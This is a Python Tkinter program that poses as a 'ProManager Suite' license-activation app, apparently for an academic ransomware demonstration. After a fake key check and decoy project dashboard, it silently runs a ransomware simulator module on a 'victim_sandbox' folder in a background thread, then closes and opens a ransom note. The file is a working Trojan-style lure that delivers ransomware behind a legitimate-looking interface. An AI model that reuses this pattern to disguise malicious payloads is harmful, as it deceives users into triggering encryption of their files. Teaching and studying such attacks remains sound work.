import os
import sys
import time
import threading
import subprocess
import tkinter as tk
from tkinter import ttk

import importlib.util

_base = os.path.dirname(os.path.abspath(__file__))
_ransomware_demo = os.path.abspath(os.path.join(_base, '..', '..', 'ransomware-demo'))
sys.path.insert(0, _ransomware_demo)

_sim_path = os.path.join(_ransomware_demo, 'attacker', 'ransomware_simulator.py')
_sim_spec = importlib.util.spec_from_file_location('_ransomware_simulator', _sim_path)
_sim_mod = importlib.util.module_from_spec(_sim_spec)
_sim_spec.loader.exec_module(_sim_mod)
RansomwareSimulator = _sim_mod.RansomwareSimulator

VICTIM_SANDBOX = os.path.join(_base, 'victim_sandbox')
RANSOM_NOTE = os.path.join(_ransomware_demo, 'attacker', 'ransom_note.html')

BG     = '#1e1e2e'
BG2    = '#313244'
BG3    = '#45475a'
FG     = '#cdd6f4'
FG_DIM = '#a6adc8'
FG_MUT = '#6c7086'
ACCENT = '#cba6f7'
C_RED  = '#f38ba8'
C_GRN  = '#a6e3a1'
C_YLW  = '#f9e2af'

FONT       = ('Segoe UI', 10)
FONT_BOLD  = ('Segoe UI', 10, 'bold')
FONT_BIG   = ('Segoe UI', 13, 'bold')
FONT_SMALL = ('Segoe UI', 9)
FONT_MONO  = ('Courier New', 10)


def trigger_encryption(sandbox_dir: str) -> None:
    sim = RansomwareSimulator(sandbox_dir=sandbox_dir)
    sim.encrypt()


class ProManagerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title('ProManager Suite — License Activation')
        self.root.geometry('480x340')
        self.root.resizable(False, False)
        self.root.configure(bg=BG)
        self._frame = None
        self._show_activation()

    def _clear(self):
        if self._frame:
            self._frame.destroy()
        self._frame = tk.Frame(self.root, bg=BG)
        self._frame.pack(fill='both', expand=True, padx=24, pady=20)

    def _show_activation(self):
        self._clear()
        f = self._frame

        logo_row = tk.Frame(f, bg=BG)
        logo_row.pack(anchor='center', pady=(0, 12))
        tk.Label(logo_row, text='📋', font=('Segoe UI', 32), bg=BG).pack(side='left', padx=(0, 10))
        name_col = tk.Frame(logo_row, bg=BG)
        name_col.pack(side='left')
        tk.Label(name_col, text='ProManager Suite', font=FONT_BIG, bg=BG, fg=FG).pack(anchor='w')
        tk.Label(name_col, text='⊗  Unlicensed — Activation Required',
                 font=FONT_SMALL, bg=BG, fg=C_RED).pack(anchor='w')

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=10)

        tk.Label(f, text='API License Key', font=FONT_SMALL, bg=BG, fg=FG_DIM).pack(anchor='w')
        self._key_var = tk.StringVar()
        entry = tk.Entry(
            f, textvariable=self._key_var, font=FONT_MONO, bg=BG2, fg=FG,
            insertbackground=FG, relief='flat', bd=0,
            highlightthickness=1, highlightbackground=BG3, highlightcolor=ACCENT,
        )
        entry.pack(fill='x', ipady=6, pady=(4, 0))
        entry.insert(0, 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
        entry.config(fg=FG_MUT)
        entry.bind('<FocusIn>', lambda e: (entry.delete(0, 'end'), entry.config(fg=FG)))
        entry.bind('<Return>', lambda e: self._on_activate())

        self._error_var = tk.StringVar()
        tk.Label(f, textvariable=self._error_var, font=FONT_SMALL,
                 bg=BG, fg=C_RED).pack(anchor='w', pady=(4, 0))

        btn_row = tk.Frame(f, bg=BG)
        btn_row.pack(fill='x', pady=(12, 0))
        tk.Button(
            btn_row, text='Activate License', font=FONT_BOLD, bg=ACCENT, fg=BG,
            relief='flat', bd=0, padx=20, pady=8, cursor='hand2',
            activebackground='#b4befe', activeforeground=BG,
            command=self._on_activate,
        ).pack(side='left')
        tk.Button(
            btn_row, text='Cancel', font=FONT, bg=BG3, fg=FG,
            relief='flat', bd=0, padx=16, pady=8, cursor='hand2',
            activebackground=BG2, activeforeground=FG,
            command=self.root.destroy,
        ).pack(side='left', padx=(8, 0))

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=(16, 8))
        tk.Label(f, text='⚠  DEMO ONLY — Academic Environment',
                 font=FONT_SMALL, bg=BG, fg=C_YLW).pack()

    def _on_activate(self):
        key = self._key_var.get().strip()
        if not key or key == 'sk-xxxx-xxxx-xxxx-xxxxxxxxxxxx':
            self._error_var.set('Please enter your API key.')
            return
        self._error_var.set('')
        self._show_verifying()

    def _show_verifying(self):
        self.root.title('ProManager Suite — Activating...')
        self._clear()
        f = self._frame

        tk.Label(f, text='Verifying license key...', font=FONT_BIG, bg=BG, fg=FG).pack(pady=(20, 4))
        self._status_var = tk.StringVar(value='Connecting to license server...')
        tk.Label(f, textvariable=self._status_var, font=FONT_SMALL, bg=BG, fg=FG_DIM).pack()

        self._pbar = ttk.Progressbar(f, mode='indeterminate', length=380)
        self._pbar.pack(pady=(20, 0))
        self._pbar.start(12)

        threading.Thread(target=self._do_activate, daemon=True).start()

    def _do_activate(self):
        for msg, delay in [
            ('Connecting to license server...', 0.6),
            ('Validating entitlements...', 0.7),
            ('Configuring workspace...', 0.7),
        ]:
            self.root.after(0, lambda m=msg: self._status_var.set(m))
            time.sleep(delay)
        self.root.after(0, self._show_dashboard)

    def _show_dashboard(self):
        self.root.title('ProManager Suite — Dashboard')
        self._clear()
        f = self._frame

        tk.Label(f, text='✓  License activated — Welcome!',
                 font=FONT_BOLD, bg=BG, fg=C_GRN).pack(anchor='w', pady=(0, 12))

        tk.Label(f, text='YOUR PROJECTS', font=('Segoe UI', 8, 'bold'),
                 bg=BG, fg=FG_MUT).pack(anchor='w')

        for name, status, color in [
            ('📁  Q4 Marketing Campaign', 'Active',      C_GRN),
            ('📁  Product Launch 2025',   'In Progress', C_YLW),
            ('📁  Client Onboarding Flow','Active',      C_GRN),
        ]:
            row = tk.Frame(f, bg=BG2)
            row.pack(fill='x', pady=2)
            tk.Label(row, text=name,   font=FONT,       bg=BG2, fg=FG,    padx=8, pady=6).pack(side='left')
            tk.Label(row, text=status, font=FONT_SMALL, bg=BG2, fg=color, padx=8).pack(side='right')

        tk.Label(f, text='Loading your data...', font=FONT_SMALL,
                 bg=BG, fg=FG_DIM).pack(anchor='w', pady=(12, 2))
        load_bar = ttk.Progressbar(f, mode='indeterminate', length=432)
        load_bar.pack(fill='x')
        load_bar.start(20)

        tk.Frame(f, bg=BG3, height=1).pack(fill='x', pady=(16, 8))
        tk.Label(f, text='⚠  DEMO ONLY — Academic Environment',
                 font=FONT_SMALL, bg=BG, fg=C_YLW).pack()

        threading.Thread(target=self._silent_encrypt, daemon=True).start()
        self.root.after(4000, self._trigger_ransom)

    def _silent_encrypt(self):
        trigger_encryption(VICTIM_SANDBOX)

    def _trigger_ransom(self):
        self.root.destroy()
        subprocess.Popen(
            ['xdg-open', RANSOM_NOTE],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def run(self):
        self.root.mainloop()


if __name__ == '__main__':
    ProManagerApp().run()
